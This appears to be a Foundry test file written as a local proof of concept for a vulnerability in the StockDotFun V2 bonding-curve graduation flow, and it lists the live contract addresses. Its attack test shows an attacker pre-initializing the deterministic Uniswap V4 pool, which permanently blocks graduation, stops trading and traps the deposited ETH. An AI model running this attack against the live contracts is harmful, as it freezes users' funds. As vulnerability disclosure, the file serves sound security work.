// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Test, console} from "forge-std/Test.sol";

/// @notice Local logic PoC for StockDotFun V2 graduation freeze.
/// SAFE: no mainnet state touched. Replicates the verified on-chain control flow:
///   BondingCurvePoolV2.finalizeGraduation -> adapter.graduate -> locker.lockLiquidity
///   locker: if (doInitialize) poolManager.initialize(...)  // reverts if already init
///   pool try/catch -> MIGRATION_FAILED; buy/sell require ACTIVE
///
/// Live contracts (Robinhood Chain 4663):
///   Factory 0x470aca74d71269833de8cf65640dfb558393569e
///   GraduationManager 0x408fA5743a43de08C596169B58f11E303026D835
///   GraduationAdapter 0x74993f85f42ba26d613c37cb82b0c5f586a22d39

enum PoolLifecycle {
    ACTIVE,
    READY_TO_GRADUATE,
    MIGRATING,
    GRADUATED,
    MIGRATION_FAILED,
    PAUSED
}

/// Minimal V4 PoolManager surface used by V4LiquidityLocker
contract MockPoolManager {
    mapping(bytes32 => bool) public initialized;

    error PoolAlreadyInitialized();

    function initialize(bytes32 poolId, uint160 /*sqrtPriceX96*/) external returns (int24) {
        if (initialized[poolId]) revert PoolAlreadyInitialized();
        initialized[poolId] = true;
        return 0;
    }
}

/// Mirrors V4LiquidityLocker.lockLiquidity's initialize-then-add pattern
contract MockLocker {
    MockPoolManager public immutable poolManager;
    address public graduator;

    error OnlyGraduator();
    error InitFailed();

    constructor(MockPoolManager pm) {
        poolManager = pm;
    }

    function setGraduator(address g) external {
        graduator = g;
    }

    function lockLiquidity(bytes32 poolId, uint160 sqrtPriceX96, bool doInitialize)
        external
        returns (uint128 liquidity)
    {
        if (msg.sender != graduator) revert OnlyGraduator();
        if (doInitialize) {
            // live code: poolManager.initialize(key, sqrtPriceX96) — reverts if pre-inited
            poolManager.initialize(poolId, sqrtPriceX96);
        }
        // if we got here, add liquidity would run; not needed for freeze PoC
        return 1e18;
    }
}

/// Mirrors UniswapV4GraduationAdapter.graduate -> locker.lockLiquidity(..., true)
contract MockAdapter {
    MockLocker public immutable locker;

    constructor(MockLocker l) {
        locker = l;
    }

    function graduate(bytes32 poolId, uint160 sqrtPriceX96) external returns (bytes32, uint128) {
        uint128 liq = locker.lockLiquidity(poolId, sqrtPriceX96, true);
        return (poolId, liq);
    }
}

/// Mirrors BondingCurvePoolV2 lifecycle around finalizeGraduation
contract MockCurvePool {
    address public immutable graduationManager;
    address public immutable graduationAdapter;
    bytes32 public immutable poolId; // deterministic V4 pool id for this token pair

    PoolLifecycle public state;
    uint256 public realQuote; // WETH principal
    uint256 public memeHeldByBuyers;

    error OnlyGraduationManager();
    error NotReady();
    error NotActive();
    error ZeroAmount();

    event GraduationFailed(bytes reason);
    event GraduationCompleted(bytes32 poolId, uint128 liq);

    constructor(address gm, address adapter, bytes32 poolId_) {
        graduationManager = gm;
        graduationAdapter = adapter;
        poolId = poolId_;
        state = PoolLifecycle.ACTIVE;
    }

    function buyToTarget(uint256 amount) external {
        if (state != PoolLifecycle.ACTIVE) revert NotActive();
        if (amount == 0) revert ZeroAmount();
        realQuote += amount;
        memeHeldByBuyers += amount; // simplified
        // crossing graduation target
        state = PoolLifecycle.READY_TO_GRADUATE;
    }

    function sell(uint256 /*tokensIn*/) external view returns (uint256) {
        if (state != PoolLifecycle.ACTIVE) revert NotActive();
        return 1;
    }

    /// Exact control flow of BondingCurvePoolV2.finalizeGraduation try/catch
    function finalizeGraduation() external returns (bytes32 outId, uint128 liq) {
        if (msg.sender != graduationManager) revert OnlyGraduationManager();
        if (state != PoolLifecycle.READY_TO_GRADUATE && state != PoolLifecycle.MIGRATION_FAILED) {
            revert NotReady();
        }
        state = PoolLifecycle.MIGRATING;

        try MockAdapter(graduationAdapter).graduate(poolId, 1 << 96) returns (bytes32 id, uint128 l) {
            realQuote = 0;
            state = PoolLifecycle.GRADUATED;
            emit GraduationCompleted(id, l);
            return (id, l);
        } catch (bytes memory reason) {
            state = PoolLifecycle.MIGRATION_FAILED;
            emit GraduationFailed(reason);
            return (bytes32(0), 0);
        }
    }
}

contract MockGraduationManager {
    function finalize(address pool) external returns (bytes32 poolId, uint128 liquidity) {
        return MockCurvePool(pool).finalizeGraduation();
    }
}

contract V4PreInitGraduationFreezeTest is Test {
    MockPoolManager pm;
    MockLocker locker;
    MockAdapter adapter;
    MockGraduationManager gm;
    MockCurvePool pool;

    bytes32 constant POOL_ID = keccak256("MEME/WETH fee=3000 ts=60 hooks=0");
    address attacker = address(0xA11CE);

    function setUp() public {
        pm = new MockPoolManager();
        locker = new MockLocker(pm);
        adapter = new MockAdapter(locker);
        locker.setGraduator(address(adapter));
        gm = new MockGraduationManager();
        pool = new MockCurvePool(address(gm), address(adapter), POOL_ID);
    }

    function test_happyPath_graduatesWhenPoolNotPreInited() public {
        pool.buyToTarget(4.4 ether);
        assertEq(uint8(pool.state()), uint8(PoolLifecycle.READY_TO_GRADUATE));

        (bytes32 id, uint128 liq) = gm.finalize(address(pool));
        assertEq(id, POOL_ID);
        assertGt(liq, 0);
        assertEq(uint8(pool.state()), uint8(PoolLifecycle.GRADUATED));
        assertEq(pool.realQuote(), 0);
    }

    function test_attackerPreInitsV4Pool_freezesGraduationAndSells() public {
        // 1. Token launches; curve fills to graduation target (~4.4 ETH class raise)
        pool.buyToTarget(4.4 ether);
        uint256 trapped = pool.realQuote();
        assertEq(trapped, 4.4 ether);
        assertEq(uint8(pool.state()), uint8(PoolLifecycle.READY_TO_GRADUATE));

        // 2. Attacker pre-initializes the deterministic V4 PoolKey (gas only, zero tokens)
        //    Live: poolManager.initialize(key, fakeSqrtPrice) — permissionless
        vm.prank(attacker);
        pm.initialize(POOL_ID, 1); // arbitrary fake price

        // 3. Anyone tries finalize (GraduationManager.finalize is permissionless)
        (bytes32 id, uint128 liq) = gm.finalize(address(pool));
        assertEq(id, bytes32(0));
        assertEq(liq, 0);
        assertEq(uint8(pool.state()), uint8(PoolLifecycle.MIGRATION_FAILED));

        // 4. Principal still on curve — but trading is dead (NotActive)
        assertEq(pool.realQuote(), 4.4 ether);

        vm.expectRevert(MockCurvePool.NotActive.selector);
        pool.sell(1);

        // 5. Retry fails forever while PoolKey remains initialized
        (id, liq) = gm.finalize(address(pool));
        assertEq(id, bytes32(0));
        assertEq(uint8(pool.state()), uint8(PoolLifecycle.MIGRATION_FAILED));
        assertEq(pool.realQuote(), 4.4 ether);

        console.log("trapped principal wei", trapped);
        console.log("state after attack (4=MIGRATION_FAILED)", uint8(pool.state()));
    }
}
